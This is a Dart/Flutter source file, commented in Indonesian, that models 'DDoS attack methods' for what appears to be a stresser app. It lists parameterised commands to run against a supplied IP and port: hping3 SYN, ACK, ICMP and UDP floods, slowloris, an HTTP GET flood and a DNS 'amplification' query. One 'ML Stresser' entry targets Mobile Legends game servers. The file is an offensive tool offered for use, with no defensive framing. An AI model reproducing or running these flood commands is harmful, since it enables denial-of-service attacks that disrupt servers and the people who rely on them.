import 'package:flutter/material.dart';

/// Enum untuk kategori serangan
enum KategoriSerangan { 
  TCP, 
  ICMP, 
  KUSTOM, 
  ML_KHUSUS 
}

/// Enum untuk mode serangan
enum ModeSerangan { 
  PPS, 
  GBPS 
}

/// Model data untuk metode serangan DDoS
class MetodeSerangan {
  final String id;
  final String nama;
  final String deskripsi;
  final IconData ikon;
  final String perintah;
  final bool membutuhkanPort;
  final bool mendukungPPS;
  final bool mendukungGBPS;
  final KategoriSerangan kategori;

  const MetodeSerangan({
    required this.id,
    required this.nama,
    required this.deskripsi,
    required this.ikon,
    required this.perintah,
    required this.membutuhkanPort,
    required this.mendukungPPS,
    required this.mendukungGBPS,
    required this.kategori,
  });

  /// Convert to Map for JSON serialization
  Map<String, dynamic> toMap() {
    return {
      'id': id,
      'nama': nama,
      'deskripsi': deskripsi,
      'ikon': ikon.codePoint,
      'perintah': perintah,
      'membutuhkanPort': membutuhkanPort,
      'mendukungPPS': mendukungPPS,
      'mendukungGBPS': mendukungGBPS,
      'kategori': kategori.name,
    };
  }

  /// Create from Map for JSON deserialization
  factory MetodeSerangan.fromMap(Map<String, dynamic> map) {
    return MetodeSerangan(
      id: map['id'] ?? '',
      nama: map['nama'] ?? '',
      deskripsi: map['deskripsi'] ?? '',
      ikon: IconData(map['ikon'] ?? Icons.security.codePoint, fontFamily: 'MaterialIcons'),
      perintah: map['perintah'] ?? '',
      membutuhkanPort: map['membutuhkanPort'] ?? false,
      mendukungPPS: map['mendukungPPS'] ?? false,
      mendukungGBPS: map['mendukungGBPS'] ?? false,
      kategori: KategoriSerangan.values.firstWhere(
        (e) => e.name == map['kategori'],
        orElse: () => KategoriSerangan.KUSTOM,
      ),
    );
  }

  @override
  String toString() {
    return 'MetodeSerangan(id: $id, nama: $nama, kategori: $kategori)';
  }

  @override
  bool operator ==(Object other) {
    if (identical(this, other)) return true;
    return other is MetodeSerangan && other.id == id;
  }

  @override
  int get hashCode => id.hashCode;
}

/// Daftar metode serangan yang tersedia
final List<MetodeSerangan> daftarMetodeSerangan = [
  MetodeSerangan(
    id: 'ml',
    nama: 'ML Stresser',
    deskripsi: 'Serangan khusus untuk server Mobile Legends dengan targeting port game',
    ikon: Icons.games,
    perintah: 'hping3 --syn --flood -p 5000-5010 {ip}',
    membutuhkanPort: false,
    mendukungPPS: true,
    mendukungGBPS: false,
    kategori: KategoriSerangan.ML_KHUSUS,
  ),
  MetodeSerangan(
    id: 'tcp_syn',
    nama: 'TCP SYN Flood',
    deskripsi: 'Serangan TCP SYN flood untuk menghabiskan koneksi server',
    ikon: Icons.network_check,
    perintah: 'hping3 --syn --flood -p {port} {ip}',
    membutuhkanPort: true,
    mendukungPPS: true,
    mendukungGBPS: false,
    kategori: KategoriSerangan.TCP,
  ),
  MetodeSerangan(
    id: 'tcp_ack',
    nama: 'TCP ACK Flood',
    deskripsi: 'Serangan TCP ACK flood untuk bypass firewall',
    ikon: Icons.security,
    perintah: 'hping3 --ack --flood -p {port} {ip}',
    membutuhkanPort: true,
    mendukungPPS: true,
    mendukungGBPS: false,
    kategori: KategoriSerangan.TCP,
  ),
  MetodeSerangan(
    id: 'icmp_flood',
    nama: 'ICMP Flood',
    deskripsi: 'Serangan ICMP ping flood untuk menghabiskan bandwidth',
    ikon: Icons.wifi_tethering,
    perintah: 'hping3 --icmp --flood {ip}',
    membutuhkanPort: false,
    mendukungPPS: true,
    mendukungGBPS: true,
    kategori: KategoriSerangan.ICMP,
  ),
  MetodeSerangan(
    id: 'udp_flood',
    nama: 'UDP Flood',
    deskripsi: 'Serangan UDP flood untuk menghabiskan bandwidth server',
    ikon: Icons.flash_on,
    perintah: 'hping3 --udp --flood -p {port} {ip}',
    membutuhkanPort: true,
    mendukungPPS: true,
    mendukungGBPS: true,
    kategori: KategoriSerangan.KUSTOM,
  ),
  MetodeSerangan(
    id: 'slowloris',
    nama: 'Slowloris',
    deskripsi: 'Serangan slow HTTP untuk menghabiskan koneksi web server',
    ikon: Icons.hourglass_empty,
    perintah: 'slowloris -s 200 -p {port} {ip}',
    membutuhkanPort: true,
    mendukungPPS: false,
    mendukungGBPS: false,
    kategori: KategoriSerangan.KUSTOM,
  ),
  MetodeSerangan(
    id: 'http_get',
    nama: 'HTTP GET Flood',
    deskripsi: 'Serangan HTTP GET flood untuk web server',
    ikon: Icons.http,
    perintah: 'curl -X GET http://{ip}:{port}/ --max-time 1 --retry 0',
    membutuhkanPort: true,
    mendukungPPS: true,
    mendukungGBPS: false,
    kategori: KategoriSerangan.KUSTOM,
  ),
  MetodeSerangan(
    id: 'dns_amp',
    nama: 'DNS Amplification',
    deskripsi: 'Serangan DNS amplification untuk amplifikasi traffic',
    ikon: Icons.dns,
    perintah: 'dig @{ip} ANY google.com +short',
    membutuhkanPort: false,
    mendukungPPS: true,
    mendukungGBPS: true,
    kategori: KategoriSerangan.KUSTOM,
  ),
];
